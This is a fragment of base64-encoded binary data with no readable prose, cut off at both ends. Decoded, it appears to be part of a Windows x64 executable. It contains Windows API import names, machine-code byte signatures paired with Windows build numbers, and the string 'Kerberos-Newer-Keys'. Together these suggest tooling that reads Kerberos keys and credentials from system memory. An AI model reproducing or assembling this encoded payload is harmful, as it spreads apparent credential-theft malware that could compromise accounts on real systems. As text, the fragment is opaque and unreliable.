dGlvbkZpbHRlcgAAswRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAagJHZXRTdGFydHVwSW5mb1cABgNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AEtFUk5FTDMyLmRsbAAA8QJTeXN0ZW1GdW5jdGlvbjAzNgAaAkdldE1vZHVsZUZpbGVOYW1lVwAAJQRSdGxVbndpbmRFeADxAkludGVybG9ja2VkRmx1c2hTTGlzdADrAkluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQA0wRUbHNBbGxvYwAA1QRUbHNHZXRWYWx1ZQDWBFRsc1NldFZhbHVlANQEVGxzRnJlZQBAA0xvYWRMaWJyYXJ5RXhXAADyAEVudGVyQ3JpdGljYWxTZWN0aW9uAAA7A0xlYXZlQ3JpdGljYWxTZWN0aW9uAADSAERlbGV0ZUNyaXRpY2FsU2VjdGlvbgCMAUdldENvbW1hbmRMaW5lQQCNAUdldENvbW1hbmRMaW5lVwAfAUV4aXRQcm9jZXNzAM4EVGVybWluYXRlUHJvY2VzcwAAHQJHZXRNb2R1bGVIYW5kbGVFeFcAAGkDTXVsdGlCeXRlVG9XaWRlQ2hhcgAgBVdpZGVDaGFyVG9NdWx0aUJ5dGUA1wJIZWFwRnJlZQAA0wJIZWFwQWxsb2MAbgFHZXRBQ1AAAPoBR2V0RmlsZVR5cGUALwNMQ01hcFN0cmluZ1cAAKABR2V0Q29uc29sZUNQAACyAUdldENvbnNvbGVNb2RlAACUBFNldFN0ZEhhbmRsZQAAcAJHZXRTdHJpbmdUeXBlVwAADANJc1ZhbGlkQ29kZVBhZ2UAPgJHZXRPRU1DUAAAeAFHZXRDUEluZm8A4QFHZXRFbnZpcm9ubWVudFN0cmluZ3NXAABnAUZyZWVFbnZpcm9ubWVudFN0cmluZ3NXAFECR2V0UHJvY2Vzc0hlYXAAAHUEU2V0RmlsZVBvaW50ZXJFeAAAMwVXcml0ZUNvbnNvbGVXANwCSGVhcFNpemUAANoCSGVhcFJlQWxsb2MAYQRTZXRFbmRPZkZpbGUAAMEDUmVhZENvbnNvbGVXAAC0A1JhaXNlRXhjZXB0aW9uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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DAAAAAAAAAAYjQeAAQAAAAEAAAAAAAAAInsHgAEAAAD+////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAAKCBB4ABAAAAAQAAAAAAAAAieweAAQAAAPD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAA/IEHgAEAAAAGAAAAAAAAAKyMB4ABAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQAAAAAAAAB4jQeAAQAAAAEAAAAAAAAAInsHgAEAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAKSMB4ABAAAAAQAAAAAAAAAieweAAQAAAP7///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAAAAAALI0HgAEAAAABAAAAAAAAACJ7B4ABAAAA8////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAAAAAAA8jQeAAQAAAAYAAAAAAAAArIwHgAEAAAD1////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAPCBB4ABAAAABgAAAAAAAACsjAeAAQAAAPz///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAuI4HgAEAAAABAAAAAAAAACJ7B4ABAAAA/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAAAAAACIjQeAAQAAAAEAAAAAAAAAInsHgAEAAADw////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAMSBB4ABAAAABgAAAAAAAACsjAeAAQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAA0IEHgAEAAAABAAAAAAAAACJ7B4ABAAAADwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAAAAACAgQeAAQAAAAEAAAAAAAAAInsHgAEAAAD+////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAAAAAAAEyCB4ABAAAAAQAAAAAAAAAieweAAQAAAPL///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEAAAAAAAAAkIwHgAEAAAABAAAAAAAAACJ7B4ABAAAAGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAAAAAAAC4gQeAAQAAAAEAAAAAAAAAInsHgAEAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAEiNB4ABAAAAAQAAAAAAAAAieweAAQAAAPX///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAGIIHgAEAAAABAAAAAAAAACJ7B4ABAAAA7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAAAAAACIgQeAAQAAAAYAAAAAAAAArIwHgAEAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAJCOB4ABAAAAAQAAAAAAAAAieweAAQAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAAAAAAtIwHgAEAAAABAAAAAAAAACJ7B4ABAAAA/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAAAAAACUjQeAAQAAAAEAAAAAAAAAInsHgAEAAADz////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAKyBB4ABAAAABgAAAAAAAACsjAeAAQAAAPX///8AAAAA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